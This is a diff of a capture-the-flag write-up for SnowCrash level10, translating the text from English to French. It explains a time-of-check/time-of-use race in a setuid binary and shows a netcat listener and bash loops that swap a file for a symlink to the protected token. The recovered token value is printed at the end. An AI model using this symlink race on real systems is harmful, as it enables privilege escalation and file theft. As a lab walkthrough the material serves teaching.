@@ -1,7 +1,6 @@
-# Level 10
-This one is my favorite
+# 10 - Binary exploit: race condition
 
-- We login as user level10.
+- On se connecte en tant level10.
 ```
 level10@SnowCrash:~$ ls -l
 total 16
@@ -10,7 +9,7 @@ total 16
 ```
 
 
-- A binary has been left for us. Let's take a closer look at this binary using [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
+- Un binaire nous a été laissé. Regardons ça de plus près avec [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
 ```
 (gdb) info functions
 All defined functions:
@@ -33,7 +32,7 @@ End of assembler dump.
 ```
 
 
-- Let's save time, we can use [Ghidra](https://en.wikipedia.org/wiki/Ghidra) to get an interpretation of the source code of this binary.
+- Gagnons du temps et utilisons [Ghidra](https://en.wikipedia.org/wiki/Ghidra) pour obtenir une interprétation de ce binaire en C.
 ```c
 int main(int argc,char **argv)
 {
@@ -101,20 +100,21 @@ int main(int argc,char **argv)
 ```
 
 
-- We can see that the program makes a call to `access(argv[1])`. If this call succeeds, it will attempt to establish a socket connection to `argv[2]` through port 6969 in order to send the content of the file named `argv[1]`.
+- On peut voir que le programme fait un appel à `access(argv[1])`. Si cet appel réussit, il tentera d'établir une connexion socket vers `argv[2]` à travers le port 6969 afin d'envoyer le contenu du fichier nommé `argv[1]`.
 
 
-- Given that `access()` does not consider [the setuid and setgid bits](https://en.wikipedia.org/wiki/Setuid) when checking permissions, the program displays `You don't have access to the token` and then terminates.
+- `access()` ne prend pas en compte les bits setuid et setgid lors de la vérification des permissions. Le programme affichera donc `You don't have access to the token` et se terminera si on lui passe directement le token en paramètre.
+
+- Cependant, `open()` prend en compte les bits setuid et setgid lors de la vérification des permissions.
+
+- Avec un script, on peut créer un fichier accessible en lecture, le supprimer, puis créer un lien symbolique avec le même nom pointant vers le token. Ainsi, le programme pourra lire le token et nous l'envoyer.
 
 
-- Note that `open()` takes into account the setuid and setgid bits when checking permissions.
-So, between the time when the program calls `access(our_file)` and the time when it calls `open(our_file)`, it is possible for us to replace `our_file` with a file of the same name in order to pass the access check with a file that can be read.
+- Du coup, avec netcat, on va écouter sur le port 6969:
+>`nc -lk 6969 > /tmp/pwn.log`
 
 
-- Thus, we will need 3 terminals. The first one will run `nc -lk 6969 > /tmp/pwn.log` to listen on all IPs through port 6969 and store everything it receives in `/tmp/pwn.log`.
-
-
-- In a `while true` loop, the second part script creates a file accessible for reading, deletes it, and then creates a symbolic link with the same name, pointing to `/home/user/level10/token`.
+- Ensuite, dans un autre terminal on lance notre script:
 ```bash
 #!/bin/bash
 while true
@@ -127,7 +127,7 @@ done
 ```
 
 
-- The latter will run our binary in a loop, passing the readable file as a parameter to it.
+- Enfin dans un troisième terminal, on lance le programme:
 ```bash
 #!/bin/bash
 while true
@@ -137,7 +137,7 @@ done
 ```
 
 
-- Thus:
+- Puis on attend d'avoir le bon timming.
 ```
 level10@SnowCrash:~$ cat /tmp/pwn.log | grep -v ".*( )*."
 woupa2yuojeeaaed06riuj63c
